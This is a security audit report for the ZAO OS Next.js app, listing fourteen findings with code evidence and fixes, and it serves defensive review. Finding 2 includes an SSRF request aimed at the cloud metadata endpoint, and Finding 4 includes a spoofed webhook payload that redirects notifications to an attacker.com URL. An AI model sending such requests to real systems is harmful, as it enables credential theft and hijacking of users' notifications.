# Security Findings — ZAO OS Full Audit

All findings ranked by severity (Critical → Low → Info).

---

## [HIGH] Finding 1: CSP allows `unsafe-eval` and `unsafe-inline` for scripts {#finding-1}

- **OWASP:** A05 — Security Misconfiguration
- **STRIDE:** Tampering
- **Location:** `next.config.ts:37`
- **Confidence:** Confirmed
- **Description:** The Content-Security-Policy `script-src` directive includes both `'unsafe-eval'` and `'unsafe-inline'`, which significantly weakens XSS protection. If any user-controlled data reaches the DOM, these directives allow exploitation.
- **Code Evidence:**
  ```typescript
  "script-src 'self' 'unsafe-eval' 'unsafe-inline' https://neynarxyz.github.io https://api.neynar.com https://open.spotify.com https://www.youtube.com https://w.soundcloud.com",
  ```
- **Attack Scenario:** If an attacker finds any path where user input is reflected in HTML (even through a third-party dependency), `unsafe-inline` allows the injected script to execute. `unsafe-eval` allows `eval()` and `Function()` constructors.
- **Mitigation:** Replace `unsafe-inline` with nonce-based CSP using Next.js `nonce` support. Remove `unsafe-eval` if possible (may require Turbopack/webpack adjustments). If `unsafe-eval` is needed for dev, restrict it to development builds only.
  ```typescript
  // Use nonce-based CSP instead
  "script-src 'self' 'nonce-${nonce}' https://neynarxyz.github.io ...",
  ```
- **References:** CWE-16 (Configuration), OWASP CSP Cheat Sheet

---

## [HIGH] Finding 2: next/image allows any HTTPS hostname — potential SSRF via image proxy {#finding-2}

- **OWASP:** A10 — Server-Side Request Forgery
- **STRIDE:** Information Disclosure
- **Location:** `next.config.ts:21`
- **Confidence:** Likely
- **Description:** The `images.remotePatterns` configuration allows any HTTPS hostname (`hostname: '**'`). Next.js image optimization acts as a server-side proxy, fetching and processing images. An attacker could craft an `<Image>` or `/_next/image?url=` request pointing to internal services, cloud metadata endpoints, or other sensitive URLs.
- **Code Evidence:**
  ```typescript
  images: {
    remotePatterns: [{ protocol: 'https', hostname: '**' }],
  },
  ```
- **Attack Scenario:**
  1. Attacker accesses `/_next/image?url=https://169.254.169.254/latest/meta-data/&w=256&q=75`
  2. Next.js server fetches the URL server-side to optimize the image
  3. If the response isn't a valid image, it errors — but the request was still made server-side
  4. On cloud providers (AWS, GCP), this could hit metadata endpoints
- **Mitigation:** Restrict to known hostnames:
  ```typescript
  images: {
    remotePatterns: [
      { protocol: 'https', hostname: '*.supabase.co' },
      { protocol: 'https', hostname: 'i.imgur.com' },
      { protocol: 'https', hostname: 'imagedelivery.net' },
      { protocol: 'https', hostname: '*.warpcast.com' },
      // Add specific PFP/image CDN domains
    ],
  },
  ```
- **References:** CWE-918 (SSRF), Next.js Image Optimization Security

---

## [MEDIUM] Finding 3: Missing Zod validation on `/api/users/follow` route {#finding-3}

- **OWASP:** A03 — Injection / A04 — Insecure Design
- **STRIDE:** Tampering
- **Location:** `src/app/api/users/follow/route.ts:10-12`
- **Confidence:** Confirmed
- **Description:** The follow/unfollow endpoints destructure `targetFid` directly from `req.json()` without Zod validation. Only a basic `typeof` check is performed. This breaks the project convention that all input must be validated with Zod.
- **Code Evidence:**
  ```typescript
  const { targetFid } = await request.json();
  if (!targetFid || typeof targetFid !== 'number') {
    return NextResponse.json({ error: 'Invalid target FID' }, { status: 400 });
  }
  ```
- **Impact:** While the `typeof` check prevents non-number values, it allows negative numbers, floats, NaN-adjacent values, and extremely large numbers. The value is passed directly to the Neynar API.
- **Mitigation:**
  ```typescript
  const followSchema = z.object({
    targetFid: z.number().int().positive(),
  });
  const parsed = followSchema.safeParse(await request.json());
  if (!parsed.success) {
    return NextResponse.json({ error: 'Invalid input' }, { status: 400 });
  }
  ```
- **References:** CWE-20 (Improper Input Validation)

---

## [MEDIUM] Finding 4: Mini app webhook has no cryptographic signature verification {#finding-4}

- **OWASP:** A07 — Identification and Authentication Failures
- **STRIDE:** Spoofing
- **Location:** `src/app/api/miniapp/webhook/route.ts:5-8`
- **Confidence:** Confirmed
- **Description:** The mini app webhook endpoint accepts POST requests without HMAC or signature verification. The only protection is Zod schema validation and checking the FID exists in the allowlist. Any attacker knowing a valid FID could spoof webhook events to manipulate notification tokens.
- **Code Evidence:**
  ```typescript
  // Note: The Mini App spec does not support HMAC signature verification
  // (unlike Neynar webhooks). We mitigate by validating input shape and
  // verifying the FID exists in our allowlist before processing.
  ```
- **Attack Scenario:**
  1. Attacker discovers a valid FID (19640 is hardcoded in community.config.ts)
  2. POSTs `{ "event": "notifications_enabled", "fid": 19640, "notificationDetails": { "token": "attacker-controlled", "url": "https://attacker.com" } }`
  3. Attacker's URL receives future push notifications intended for the user
- **Mitigation:** Since the Farcaster Mini App spec lacks HMAC support, add IP-based allowlisting for known Farcaster infrastructure IPs, or add a shared secret in a custom header. Document the known risk. Consider requiring the notification URL to match a known Farcaster domain pattern.
- **References:** CWE-345 (Insufficient Verification of Data Authenticity)

---

## [MEDIUM] Finding 5: In-memory rate limiting is not durable or distributed {#finding-5}

- **OWASP:** A04 — Insecure Design
- **STRIDE:** Denial of Service
- **Location:** `src/lib/rate-limit.ts:6`
- **Confidence:** Confirmed
- **Description:** Rate limiting uses an in-memory `Map` that resets on server restart and is not shared across multiple instances. In a multi-instance deployment (e.g., Vercel serverless functions), each instance has its own rate limit state, effectively multiplying the allowed rate by the number of instances.
- **Code Evidence:**
  ```typescript
  const store = new Map<string, RateLimitEntry>();
  ```
- **Attack Scenario:** Attacker sends requests that hit different serverless instances, each with its own counter. The effective rate limit becomes `N * limit` where N is the instance count.
- **Mitigation:** For production with multiple instances, use Vercel Edge Config, Upstash Redis, or KV for shared rate limit state. For single-instance deployment, the current implementation is adequate.
- **References:** CWE-770 (Allocation of Resources Without Limits)

---

## [MEDIUM] Finding 6: In-memory nonce stores are not shared across instances {#finding-6}

- **OWASP:** A07 — Identification and Authentication Failures
- **STRIDE:** Spoofing
- **Location:** `src/app/api/auth/verify/route.ts:14-16`, `src/app/api/auth/siwe/route.ts:14-16`
- **Confidence:** Likely
- **Description:** Both auth endpoints (SIWF and SIWE) use in-memory `Map` stores for nonces. In a multi-instance serverless deployment, a nonce generated on instance A can't be validated on instance B, causing auth failures. More critically, the same nonce could be replayed if the verification request hits a different instance.
- **Code Evidence:**
  ```typescript
  const nonceStore = new Map<string, number>(); // nonce → created timestamp
  ```
- **Attack Scenario:** In multi-instance deployment:
  1. User gets nonce from instance A
  2. Attacker intercepts the signed message
  3. Attacker replays the message on instance B (which doesn't know the nonce was consumed)
- **Mitigation:** Use Redis, Supabase, or Vercel KV for nonce storage in production.
- **References:** CWE-294 (Authentication Bypass by Capture-replay)

---

## [MEDIUM] Finding 7: No structured security audit logging {#finding-7}

- **OWASP:** A09 — Security Logging & Monitoring Failures
- **STRIDE:** Repudiation
- **Location:** All API routes
- **Confidence:** Confirmed
- **Description:** The application uses `console.error` for error logging but has no structured audit trail for security-sensitive operations. Admin actions (hide messages, delete users, import data, modify allowlist) are not logged with actor identity, timestamp, or affected resources in a queryable store.
- **Attack Scenario:** A compromised admin account performs destructive actions (removing users, hiding messages). There's no audit log to trace what was done, when, or by whom.
- **Mitigation:** Create a `security_audit_log` table in Supabase and log all admin operations with `{ actor_fid, action, target, details, timestamp }`. Consider also logging failed auth attempts and rate limit hits.
- **References:** CWE-778 (Insufficient Logging)

---

## [MEDIUM] Finding 8: Song submission DELETE lacks Zod validation on `id` {#finding-8}

- **OWASP:** A03 — Injection
- **STRIDE:** Tampering
- **Location:** `src/app/api/music/submissions/route.ts:111`
- **Confidence:** Confirmed
- **Description:** The DELETE handler destructures `id` directly from `req.json()` without Zod validation. While the value is used in a parameterized Supabase query (preventing SQL injection), it should be validated as a UUID per project conventions.
- **Code Evidence:**
  ```typescript
  const { id } = await req.json();
  if (!id) {
    return NextResponse.json({ error: 'Missing submission id' }, { status: 400 });
  }
  ```
- **Mitigation:**
  ```typescript
  const deleteSchema = z.object({ id: z.string().uuid() });
  const parsed = deleteSchema.safeParse(await req.json());
  ```
- **References:** CWE-20 (Improper Input Validation)

---

## [LOW] Finding 9: Session `isAdmin` is cached at login time {#finding-9}

- **OWASP:** A01 — Broken Access Control
- **STRIDE:** Elevation of Privilege
- **Location:** `src/lib/auth/session.ts:71-72`
- **Confidence:** Possible
- **Description:** The `isAdmin` flag is computed and stored in the session cookie when the user logs in. If the `adminFids` list in `community.config.ts` is changed, existing sessions retain their old admin status until they expire (7 days) or re-login.
- **Code Evidence:**
  ```typescript
  session.isAdmin = ADMIN_FIDS.includes(data.fid) ||
    (data.walletAddress ? ADMIN_WALLETS.includes(data.walletAddress.toLowerCase()) : false);
  ```
- **Impact:** Low — admin FID changes are rare and deployment typically invalidates sessions. However, revoking admin access from a compromised FID would not take immediate effect.
- **Mitigation:** For immediate revocation, check `isAdmin` dynamically in `requireAdmin()` by reading `communityConfig.adminFids` at request time rather than trusting the session value.
- **References:** CWE-613 (Insufficient Session Expiration)

---

## [LOW] Finding 10: IP spoofing possible for rate limiting {#finding-10}

- **OWASP:** A04 — Insecure Design
- **STRIDE:** Denial of Service
- **Location:** `src/middleware.ts:98-100`
- **Confidence:** Likely
- **Description:** Rate limiting uses `x-real-ip` or `x-forwarded-for` headers for IP identification. Behind some reverse proxy configurations, these headers can be spoofed by the client.
- **Code Evidence:**
  ```typescript
  const ip = request.headers.get('x-real-ip')
    || request.headers.get('x-forwarded-for')?.split(',')[0]?.trim()
    || 'unknown';
  ```
- **Impact:** Low — Vercel sets these headers server-side and strips client-supplied values, so on Vercel this is safe. On other hosting platforms, this could be exploitable.
- **Mitigation:** Document that this relies on the hosting platform setting trusted headers. On non-Vercel deployments, configure the reverse proxy to overwrite (not append to) `x-forwarded-for`.
- **References:** CWE-290 (Authentication Bypass by Spoofing)

---

## [LOW] Finding 11: Webhook secret optional in dev — documented but could be missed {#finding-11}

- **OWASP:** A05 — Security Misconfiguration
- **STRIDE:** Spoofing
- **Location:** `src/app/api/webhooks/neynar/route.ts:22-26`
- **Confidence:** Confirmed
- **Description:** The Neynar webhook handler rejects requests with a 503 when `NEYNAR_WEBHOOK_SECRET` is not set. This is safe (fail-closed), but the `.env.example` shows it as optional with a comment saying "Leave empty to skip signature verification in local dev." The current code doesn't skip — it rejects — which is the correct behavior. However, the `.env.example` comment is misleading.
- **Code Evidence:**
  ```
  # .env.example
  NEYNAR_WEBHOOK_SECRET=
  # Leave empty to skip signature verification in local dev
  ```
  Actual behavior: returns 503, does not skip.
- **Mitigation:** Update `.env.example` comment to say "Leave empty to reject webhook requests (safe for local dev where webhooks aren't needed)."
- **References:** CWE-16 (Configuration)

---

## [LOW] Finding 12: Vote weight replay — wallet change between votes {#finding-12}

- **OWASP:** A04 — Insecure Design
- **STRIDE:** Tampering
- **Location:** `src/app/api/proposals/vote/route.ts:44-46`
- **Confidence:** Possible
- **Description:** A user can vote, then change their `respect_wallet` (if that functionality exists), then vote again. Since votes use `upsert` with `onConflict: 'proposal_id,voter_id'`, the second vote replaces the first — but with the new wallet's on-chain weight. This is by design (allows changing votes), but the weight could be gamed.
- **Impact:** Low — requires access to a different wallet with different respect tokens. The economic incentive is small and the community is gated.
- **Mitigation:** Consider snapshotting vote weights at proposal creation time, or recording the wallet address used for each vote to detect changes.
- **References:** CWE-284 (Improper Access Control)

---

## [INFO] Finding 13: Missing `X-XSS-Protection` header {#finding-13}

- **OWASP:** A05 — Security Misconfiguration
- **STRIDE:** N/A
- **Location:** `src/middleware.ts:84-89`, `next.config.ts:27-48`
- **Confidence:** Confirmed
- **Description:** The `X-XSS-Protection` header is not set. While deprecated in modern browsers (CSP is the replacement), some older browsers still benefit from it.
- **Mitigation:** Add `X-XSS-Protection: 0` to explicitly disable it (the recommended modern approach, since the header's filter can actually introduce vulnerabilities in some browsers).

---

## [INFO] Finding 14: Supabase browser client created with anon key {#finding-14}

- **OWASP:** A05 — Security Misconfiguration
- **STRIDE:** N/A
- **Location:** `src/lib/db/supabase.ts:28-37`
- **Confidence:** Confirmed
- **Description:** The browser-side Supabase client uses `NEXT_PUBLIC_SUPABASE_ANON_KEY`. This is intentional and safe — RLS policies protect the data, and the anon key is designed to be public. No issue, but worth noting for awareness that all client-side Supabase access is governed by RLS policies only.
